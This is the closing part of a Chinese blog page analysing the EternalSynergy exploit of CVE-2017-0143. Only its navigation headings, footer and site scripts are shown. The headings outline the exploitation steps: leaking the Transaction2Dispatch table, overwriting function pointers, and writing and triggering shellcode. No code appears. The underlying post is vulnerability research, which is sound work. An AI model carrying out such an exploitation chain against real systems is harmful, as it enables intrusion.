class="nav-link" href="#泄露Transaction2Dispatch-Table"><span class="nav-number">6.5.</span> <span class="nav-text">泄露Transaction2Dispatch Table</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一步步获得执行权限"><span class="nav-number">7.</span> <span class="nav-text">一步步获得执行权限</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#确认可执行内存（其实是查找nt-KxUnexpectedInterrupt0）"><span class="nav-number">7.1.</span> <span class="nav-text">确认可执行内存（其实是查找nt!KxUnexpectedInterrupt0）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写入一些数据及SrvTransaction2DispatchTable函数指针改写"><span class="nav-number">7.2.</span> <span class="nav-text">写入一些数据及SrvTransaction2DispatchTable函数指针改写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode的写入"><span class="nav-number">7.3.</span> <span class="nav-text">shellcode的写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发shellcode的执行"><span class="nav-number">7.4.</span> <span class="nav-text">触发shellcode的执行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析总结"><span class="nav-number">8.</span> <span class="nav-text">漏洞分析总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析smb漏洞的一些总结"><span class="nav-number">9.</span> <span class="nav-text">分析smb漏洞的一些总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright"> &copy; 2017 &mdash; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i> 
  </span>
  <span class="author" itemprop="copyrightHolder">giantbranch(simplelogin.irjqx@aleeas.com)</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




<div class="footer-custom">
<!-- <a href="https://beian.miit.gov.cn/"></a> -->
<br>
这是我的新博客，网站建于2017年10月
<!-- <br>以下UV,PV统计始于2018.06.23 -->
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  

    
      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/';
          this.page.identifier = '2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/';
          this.page.title = 'Eternalsynergy利用的漏洞分析（CVE-2017-0143）';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://giantbranch.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  










  





  

  

  

  

  

  

</body>
</html>
